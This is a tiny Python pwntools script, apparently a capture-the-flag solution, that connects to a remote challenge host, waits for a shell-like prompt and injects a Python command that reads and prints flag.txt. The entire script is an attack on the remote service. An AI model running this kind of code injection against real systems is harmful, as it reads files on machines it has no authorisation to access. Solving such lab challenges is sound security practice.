#!/usr/bin/python3

from pwn import *

io = remote('83.136.252.96', 39991)

io.sendlineafter('$', "print(open('flag.txt').read())")
io.stream()